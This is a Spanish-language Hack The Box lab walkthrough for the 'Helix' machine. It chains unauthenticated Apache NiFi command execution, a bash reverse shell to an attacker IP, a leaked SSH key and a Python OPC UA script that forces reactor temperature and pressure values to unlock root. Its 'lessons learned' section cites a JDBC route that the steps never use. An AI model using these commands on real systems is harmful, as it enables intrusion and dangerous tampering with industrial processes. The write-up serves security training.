🧬 Helix · Hack The Box

Dificultad Media Linux ICS/SCADA Apache NiFi OPC UA  —  Walkthrough completo en español

Helix es una máquina Linux de dificultad media que simula un entorno de control industrial (SCADA/ICS). El vector de ataque comienza con una instancia de Apache NiFi 1.21.0 accesible sin autenticación, continúa con una reverse shell como el usuario nifi, avanza al usuario operator mediante una clave SSH filtrada y finaliza con una escalada a root manipulando un servidor OPC UA para abrir una ventana de mantenimiento privilegiada.

1. Reconocimiento

El escaneo inicial revela los puertos 22 (SSH) y 80 (HTTP). Mediante fuzzing de virtual hosts se descubre el subdominio flow.helix.htb, que aloja la interfaz web de Apache NiFi. 

# Añadir al /etc/hosts
echo "10.129.107.194 helix.htb flow.helix.htb" | sudo tee -a /etc/hosts

# Descubrimiento de vhost
ffuf -u http://helix.htb -H "Host: FUZZ.helix.htb" -w subdominios.txt -mc 200

2. Acceso inicial · RCE en Apache NiFi

La interfaz de NiFi (http://flow.helix.htb/nifi/) permite crear procesadores sin autenticación. Se crea un procesador ExecuteProcess con una reverse shell, que se ejecuta al iniciarlo. 

# Configuración del procesador
Command: /bin/bash
Command Arguments: -c "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"
Redirect Error Stream: true
Auto-terminate relationships: success
# Listener en máquina atacante
nc -lvnp 4444

✓ Se obtiene una shell interactiva como el usuario nifi.

3. Usuario operator

Buscando en el directorio de NiFi se encuentra una clave privada SSH del usuario operator en /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak. 

find /opt/nifi-1.21.0 -name "*operator*" -type f 2>/dev/null
cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak

Se copia la clave a la máquina local, se ajustan permisos y se conecta por SSH: 

chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@helix.htb

✓ Acceso como operator.

4. Root · Ventana de mantenimiento OPC UA

El binario /usr/local/sbin/helix-maint-console otorga una shell root, pero solo cuando la ventana de mantenimiento está abierta. Esta ventana se activa cuando el reactor alcanza condiciones peligrosas de prueba (temperatura ≥ 295 °C o presión ≥ 73 bar).

Se utiliza un script Python con la librería opcua para modificar los valores del reactor a través del servidor OPC UA en 127.0.0.1:4840. Los nodos clave son:

VariableNode ID
Modons=2;i=12
Anulación de pruebans=2;i=13
Desfase de calibraciónns=2;i=6
Temperaturans=2;i=4
Presiónns=2;i=5
 
from opcua import Client

client = Client("opc.tcp://127.0.0.1:4840")
client.set_user("operator")
client.set_password("[REDACTED]")   # contraseña extraída del PDF
client.connect()

nodes = {
    "mode": client.get_node("ns=2;i=12"),
    "override": client.get_node("ns=2;i=13"),
    "calib": client.get_node("ns=2;i=6"),
    "temp": client.get_node("ns=2;i=4"),
    "press": client.get_node("ns=2;i=5"),
}

nodes["mode"].set_value("MAINTENANCE")
nodes["override"].set_value(True)
nodes["calib"].set_value(12.0)
nodes["temp"].set_value(300.0)
nodes["press"].set_value(75.0)

client.disconnect()

Tras la manipulación, se ejecuta el binario y se obtiene una shell root: 

sudo /usr/local/sbin/helix-maint-console

✓ Shell interactiva como root.

Lecciones aprendidas

  • NiFi + JDBC = RCE: Los procesadores que aceptan URLs JDBC pueden convertirse en primitivas RCE mediante alias H2.
  • Claves SSH filtradas: Los bundles de soporte de NiFi pueden contener información sensible, incluyendo claves privadas.
  • OPC UA inseguro: Los servidores OPC UA suelen tener autenticación débil, permitiendo manipular procesos industriales.
  • Pensar como un operador: En máquinas con temática industrial, entender la lógica de la aplicación es tan importante como las técnicas de hacking.
